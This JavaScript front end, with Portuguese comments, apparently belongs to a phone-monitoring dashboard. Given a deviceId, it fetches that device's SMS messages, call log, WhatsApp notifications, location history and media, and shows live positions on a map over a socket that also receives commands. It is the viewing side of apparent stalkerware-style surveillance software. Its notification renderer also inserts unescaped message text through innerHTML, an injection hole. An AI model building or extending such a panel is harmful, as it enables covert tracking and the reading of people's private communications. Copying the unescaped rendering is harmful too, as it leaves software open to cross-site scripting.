// robust main.js - com logs e tolerância a erros
const apiBase = '/api';
let token = null;
let currentDevice = null;
let socket = null;
let map = null;
let markers = [];

function log(...args){ console.log('[APP]', ...args); }
function authHeaders(){ return token ? { 'Authorization': 'Bearer ' + token } : {}; }

document.addEventListener('DOMContentLoaded', () => {
  try {
    _initUI();
    const saved = localStorage.getItem('monitor_token');
    if (saved) {
      token = saved;
      document.getElementById('loginBox').style.display = 'none';
      document.getElementById('controls').style.display = 'flex';
    }
    initMap(); // inicializa mesmo que painel esteja oculto
  } catch(e){
    console.error('[APP] init error', e);
  }
});

function _initUI(){
  document.getElementById('btnLogin').addEventListener('click', doLogin);
  document.getElementById('btnSelect').addEventListener('click', () => {
    const d = document.getElementById('deviceIdInput').value.trim();
    if (!d) return alert('Informe deviceId');
    selectDevice(d);
  });
  document.getElementById('btnLogout').addEventListener('click', doLogout);

  document.querySelectorAll('#menuList li').forEach(li => {
    li.addEventListener('click', () => {
      document.querySelectorAll('#menuList li').forEach(x => x.classList.remove('active'));
      li.classList.add('active');
      const sec = li.dataset.sec;
      document.querySelectorAll('.panel').forEach(p => p.classList.add('hidden'));
      const el = document.getElementById(sec);
      if (el) {
        el.classList.remove('hidden');
        if (sec === 'location') {
          setTimeout(()=>{ try{ map.invalidateSize(); } catch(e){} }, 200);
        }
      }
    });
  });
}

function doLogin(){
  const u = document.getElementById('username').value.trim();
  const p = document.getElementById('password').value.trim();
  if (!u || !p) return alert('Preencha usuário e senha');
  fetch(apiBase + '/auth/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ username: u, password: p })
  }).then(async res => {
    if (!res.ok) {
      const err = await res.json().catch(()=>({error:'login failed'}));
      return alert('Login falhou: ' + (err.error || res.status));
    }
    const j = await res.json();
    token = j.token;
    localStorage.setItem('monitor_token', token);
    document.getElementById('loginBox').style.display = 'none';
    document.getElementById('controls').style.display = 'flex';
    log('Login OK');
  }).catch(e => {
    console.error('[APP] login error', e);
    alert('Erro no login — veja console (F12).');
  });
}

function doLogout(){
  token = null;
  localStorage.removeItem('monitor_token');
  document.getElementById('loginBox').style.display = 'flex';
  document.getElementById('controls').style.display = 'none';
  if (socket) { try{ socket.disconnect(); }catch(e){} socket = null; }
  currentDevice = null;
  document.getElementById('status').innerText = '—';
}

function initMap(){
  try {
    if (map) return;
    map = L.map('map', {preferCanvas:true}).setView([0,0], 2);
    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', { attribution: '© OpenStreetMap contributors' }).addTo(map);
    log('map initialized');
  } catch(e){
    console.error('[APP] map init error', e);
  }
}

function selectDevice(deviceId){
  try {
    currentDevice = deviceId;
    document.getElementById('status').innerText = 'Selected: ' + deviceId;
    if (!socket) {
      try {
        socket = io();
        socket.on('connect', () => log('socket connected', socket.id));
        socket.on('location', data => {
          if (!currentDevice) return;
          if (data.deviceId !== currentDevice) return;
          addMarker(data.lat, data.lon, data.timestamp);
        });
        socket.on('command', cmd => log('command', cmd));
      } catch(e) {
        console.warn('[APP] socket init failed', e);
      }
    }
    try { socket && socket.emit && socket.emit('joinDevice', deviceId); } catch(e){}
    fetchLists();
  } catch(e){ console.error('[APP] selectDevice err', e); }
}

async function fetchLists(){
  if (!currentDevice) return;
  const headers = authHeaders();
  try {
    const sms = await getJson(`/api/data/sms?deviceId=${encodeURIComponent(currentDevice)}`, headers); renderSms(sms);
    const calls = await getJson(`/api/data/call?deviceId=${encodeURIComponent(currentDevice)}`, headers); renderCalls(calls);
    const notifs = await getJson(`/api/data/whatsapp?deviceId=${encodeURIComponent(currentDevice)}`, headers); renderNotifs(notifs);
    const locs = await getJson(`/api/data/location?deviceId=${encodeURIComponent(currentDevice)}`, headers); renderLocations(locs);
    const media = await getJson(`/api/media?deviceId=${encodeURIComponent(currentDevice)}`, headers); renderMedia(media);
  } catch(e){ console.error('[APP] fetchLists err', e); }
}

function getJson(url, headers = {}){
  return fetch(url, { headers }).then(r => r.ok ? r.json() : []).catch(err => (console.error('[APP] fetch', url, err), []));
}

function renderSms(list){ const el = document.getElementById('smsList'); el.innerHTML=''; (list||[]).forEach(s=>{ const li=document.createElement('li'); li.textContent=`${s.sender}: ${s.message} (${new Date(s.timestamp).toLocaleString()})`; el.appendChild(li); }); }
function renderCalls(list){ const el=document.getElementById('callsList'); el.innerHTML=''; (list||[]).forEach(c=>{ const li=document.createElement('li'); li.textContent=`${c.number||'unknown'} - ${c.state} (${c.duration||''}) ${new Date(c.timestamp).toLocaleString()}`; el.appendChild(li); }); }
function renderNotifs(list){ const el=document.getElementById('notifsList'); el.innerHTML=''; (list||[]).forEach(n=>{ const li=document.createElement('li'); li.innerHTML=`<strong>${n.packageName||''}</strong> ${n.title? '['+n.title+'] ' : ''} ${n.message||''} <small>${new Date(n.timestamp).toLocaleString()}</small>`; el.appendChild(li); }); }

function renderLocations(list){
  const el = document.getElementById('locList'); el.innerHTML = '';
  markers.forEach(m=>{ try{ map.removeLayer(m); }catch(e){} });
  markers = [];
  (list||[]).forEach(l => {
    const li = document.createElement('li');
    li.textContent = `${Number(l.lat).toFixed(5)}, ${Number(l.lon).toFixed(5)} - ${new Date(l.timestamp).toLocaleString()}`;
    el.appendChild(li);
    if (map && l.lat && l.lon) {
      const m = L.marker([l.lat, l.lon]).addTo(map);
      m.bindPopup(`<b>${new Date(l.timestamp).toLocaleString()}</b><br/>lat: ${l.lat}<br/>lon: ${l.lon}<br/><a target="_blank" href="https://www.google.com/maps/search/?api=1&query=${l.lat},${l.lon}">Abrir no Google Maps</a>`);
      markers.push(m);
    }
  });
  if (markers.length && map) {
    const group = new L.featureGroup(markers);
    map.fitBounds(group.getBounds().pad(0.2));
    setTimeout(()=>{ try{ map.invalidateSize(); } catch(e){} }, 200);
  }
}

function addMarker(lat, lon, timestamp){
  if (!map) initMap();
  try {
    const m = L.circleMarker([lat, lon], { radius:6 }).addTo(map);
    m.bindPopup(`${new Date(timestamp).toLocaleString()}<br/>lat:${lat}<br/>lon:${lon}`);
    markers.push(m);
    if (markers.length > 300) { const old = markers.shift(); if (old) try{ map.removeLayer(old); }catch(e){} }
  } catch(e){ console.error('[APP] addMarker err', e); }
}

function renderMedia(list){ const el=document.getElementById('mediaList'); el.innerHTML=''; (list||[]).forEach(m=>{ const li=document.createElement('li'); const a=document.createElement('a'); a.href='/api/media/'+m.gridFsId; a.textContent=(m.filename||m._id)+' ('+(m.type||'')+')'; a.target='_blank'; li.appendChild(a); el.appendChild(li); }); }
